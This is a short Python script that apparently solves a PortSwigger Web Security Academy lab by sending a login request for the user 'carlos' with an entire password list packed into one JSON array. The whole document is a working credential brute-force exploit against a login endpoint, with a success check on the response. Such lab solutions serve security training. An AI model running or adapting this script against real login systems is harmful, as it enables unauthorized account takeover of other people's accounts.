import requests

url = 'https://ace51fde1f566cebc0a19bcb0050002d.web-security-academy.net/login'

with open('password.txt', 'r') as f:
    passwords = [passwd.strip() for passwd in f.readlines()]
    res = requests.post(url, json={'username' : 'carlos', 'password' : passwords})
    if 'Your username is: carlos' in res.text:
        print('Done')